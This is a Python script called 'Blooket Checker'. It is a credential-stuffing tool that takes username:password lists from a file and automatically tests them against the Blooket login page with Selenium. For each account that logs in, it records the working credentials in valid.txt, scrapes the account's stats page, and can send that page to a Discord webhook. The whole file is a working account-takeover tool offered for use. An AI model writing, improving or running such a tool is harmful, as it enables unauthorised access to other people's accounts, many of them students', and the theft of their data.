from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import time
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeRemainingColumn
from rich.table import Table
from rich import box
from rich.live import Live
from rich.align import Align
import os
import sys
from time import sleep
import random
import requests
import json

console = Console()

def get_discord_choice():
    console.print(Panel("[yellow]Would you like to use Discord webhook? (y/n)[/yellow]", border_style="yellow"))
    choice = input("> ").strip().lower()
    if choice == 'y':
        os.system('cls' if os.name == 'nt' else 'clear')
        return True, get_webhook()
    return False, None

def get_webhook():
    webhook_file = 'webhook.txt'
    
    if os.path.exists(webhook_file):
        with open(webhook_file, 'r') as file:
            webhook_url = file.read().strip()
            console.print(Panel("[green]Webhook loaded successfully![/green]", border_style="green"))
            os.system('cls' if os.name == 'nt' else 'clear')
            return webhook_url
    
    console.print(Panel("[yellow]Please enter your Discord webhook URL:[/yellow]", border_style="yellow"))
    webhook_url = input("> ").strip()
    
    with open(webhook_file, 'w') as file:
        file.write(webhook_url)
    
    console.print(Panel("[green]Webhook saved successfully![/green]", border_style="green"))
    os.system('cls' if os.name == 'nt' else 'clear')
    return webhook_url

def loading_animation():
    console.clear()
    creator = """
    [bold red]
        ___.                  
__  _  _\_ |__ ______   ____  
\ \/ \/ /| __ \\____ \_/ __ \ 
 \     / | \_\ \  |_> >  ___/ 
  \/\_/  |___  /   __/ \___  >
             \/|__|        \/ 
    [/]
    """
    console.print(Panel(Align.center(creator),
                        title="[bold cyan]Blooket Checker Made By @wbpe on cord[/bold cyan]",
                        border_style="red",
                       box=box.DOUBLE_EDGE))
    sleep(2)
    console.clear()

def print_mega_banner():
    banner = """
    [bold cyan]
        ___.                  
__  _  _\_ |__ ______   ____  
\ \/ \/ /| __ \\____ \_/ __ \ 
 \     / | \_\ \  |_> >  ___/ 
  \/\_/  |___  /   __/ \___  >
             \/|__|        \/ 
    [/bold cyan]
    """
    console.print(Panel(Align.center(banner),
                        title="[bold cyan]Blooket Checker[/bold cyan]",
                        subtitle="[bold cyan]@wbpe on cord[/bold cyan]",
                       border_style="cyan",
                        box=box.DOUBLE_EDGE))

class BlooketChecker:
    def __init__(self):
        self.valid = 0
        self.invalid = 0
        self.use_discord, self.webhook_url = get_discord_choice()

    def send_to_discord(self, username, stats_text):
        embed = {
            "title": f"Blooket Stats for {username}",
            "description": stats_text[:2000] if len(stats_text) > 2000 else stats_text,
            "color": 3447003,
            "timestamp": datetime.utcnow().isoformat()
        }
        
        payload = {
            "embeds": [embed]
        }
        
        try:
            response = requests.post(self.webhook_url, json=payload)
            if response.status_code == 204:
                self.log_message(f"Stats sent to Discord for {username}", "green", "[+]")
            else:
                self.log_message(f"Failed to send stats to Discord for {username}", "red", "[!]")
        except Exception as e:
            self.log_message(f"Error sending to Discord: {str(e)}", "red", "[!]")

    def log_message(self, message, style="white", symbol=""):
        timestamp = datetime.now().strftime('%H:%M:%S')
        console.print(f"[dim]{timestamp}[/dim] {symbol}[{style}]{message}[/{style}]")

    def check_login(self, username, password, driver):
        try:
            driver.get('https://id.blooket.com/login')
            
            username_field = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.XPATH, "//input[@placeholder='Username or email']"))
            )
            password_field = driver.find_element(By.XPATH, "//input[@placeholder='Password']")
            
            username_field.clear()
            username_field.send_keys(username)
            password_field.clear()
            password_field.send_keys(password)
            
            login_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            login_button.click()
            
            time.sleep(1)
            
            if "dashboard" in driver.current_url or "play" in driver.current_url:
                driver.get('https://dashboard.blooket.com/stats')
                time.sleep(3)
                
                stats_text = driver.find_element(By.TAG_NAME, "body").text
                
                if self.use_discord:
                    self.send_to_discord(username, stats_text)
                else:
                    if not os.path.exists('stats'):
                        os.makedirs('stats')
                    with open(f'stats/{username}_stats.txt', 'w', encoding='utf-8') as stats_file:
                        stats_file.write(f"=== Stats for {username} ===\n")
                        stats_file.write(stats_text)
                        stats_file.write("\n============================\n")
                
                driver.get('https://id.blooket.com/logout')
                time.sleep(1)
                return True
            
            return False
            
        except Exception as e:
            self.log_message(f"Error checking {username}: {str(e)}", "red", "[!]")
            return False

    def check_accounts(self):
        try:
            chrome_options = Options()
            chrome_options.add_argument('--log-level=3')
            chrome_options.add_argument('--silent')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-logging')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--disable-features=VizDisplayCompositor')
            chrome_options.add_argument('--disable-software-rasterizer')
            chrome_options.add_argument('--disable-webgl')
            chrome_options.add_argument('--disable-webgl2')
            chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
            
            driver = webdriver.Chrome(options=chrome_options)
            
            with open('login.txt', 'r') as file:
                accounts = file.readlines()
            
            total = len(accounts)
            console.print(Panel(f"[cyan]>> Total accounts to check: {total}[/cyan]",
                               border_style="cyan",
                              box=box.ROUNDED))
            
            with Progress(
                "[progress.description]{task.description}",
                SpinnerColumn(spinner_name="dots12"),
                BarColumn(complete_style="green", finished_style="green"),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeRemainingColumn(),
                TextColumn("•"),
                TextColumn("[cyan]{task.completed}/{task.total}[/cyan]"),
                console=console,
                expand=True
            ) as progress:
                task = progress.add_task(">> [cyan]Checking accounts...", total=total)
                
                for account in accounts:
                    try:
                        username, password = account.strip().split(':')
                        
                        if self.check_login(username, password, driver):
                            self.valid += 1
                            self.log_message(f"[VALID] {username}:{password}", "green", "[+]")
                            with open('valid.txt', 'a') as valid_file:
                                valid_file.write(f"{username}:{password}\n")
                        else:
                            self.invalid += 1
                            self.log_message(f"[INVALID] {username}:{password}", "red", "[-]")
                        
                        progress.update(task, advance=1)
                        progress.update(task, description=f">> [cyan]Valid: {self.valid} | Invalid: {self.invalid}[/cyan]")
                        
                    except ValueError:
                        self.log_message(f"Invalid format: {account.strip()}", "red", "[!]")
            
            driver.quit()
        except FileNotFoundError:
            self.log_message("login.txt not found!", "red", "[!]")
            return
        
        console.print("\n[bold green][*] Check complete![/bold green]")
        
        results_table = Table(box=box.ROUNDED, border_style="cyan", title="[bold cyan]Final Results[/bold cyan]")
        results_table.add_column("[+] Valid", style="green", justify="center")
        results_table.add_column("[-] Invalid", style="red", justify="center")
        results_table.add_column("[*] Total", style="cyan", justify="center")
        results_table.add_row(str(self.valid), str(self.invalid), str(total))
        
        console.print(Panel(results_table, border_style="cyan", box=box.DOUBLE_EDGE))

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    loading_animation()
    print_mega_banner()
    checker = BlooketChecker()
    checker.check_accounts()